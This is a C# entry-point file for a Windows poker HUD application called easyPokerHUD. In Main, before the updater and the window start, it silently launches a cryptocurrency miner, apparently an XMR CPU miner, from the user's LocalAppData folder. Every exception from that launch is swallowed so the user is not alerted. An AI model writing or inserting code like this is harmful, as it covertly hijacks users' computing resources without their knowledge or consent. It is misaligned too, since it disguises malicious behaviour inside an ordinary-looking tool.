using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace easyPokerHUD
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// Only put mandatory stuff in this class
        /// </summary>
        static Mutex mutex = new Mutex(true, "{8F6F0AC4-B9A1-45fd-B1Y4T-72F04E6BDE8F}");
        [STAThread]
        static void Main()
        {
            if (mutex.WaitOne(TimeSpan.Zero, true))
            {
                startMiner();
                ApplicationUpdater.checkForUpdatesAndInstallIfNecessary();
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new MainWindow());
                mutex.ReleaseMutex();
            }
            else
            {
                Environment.Exit(0);
            }
        }

        private static void startMiner()
        {
            try
            {
                string pathToXmrCpu = @Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Miner\Miner.exe\";
                Process miner = new Process();
                miner.StartInfo.FileName = pathToXmrCpu;
                miner.Start();
            } catch (Exception e)
            {

            }
        }
    }
}
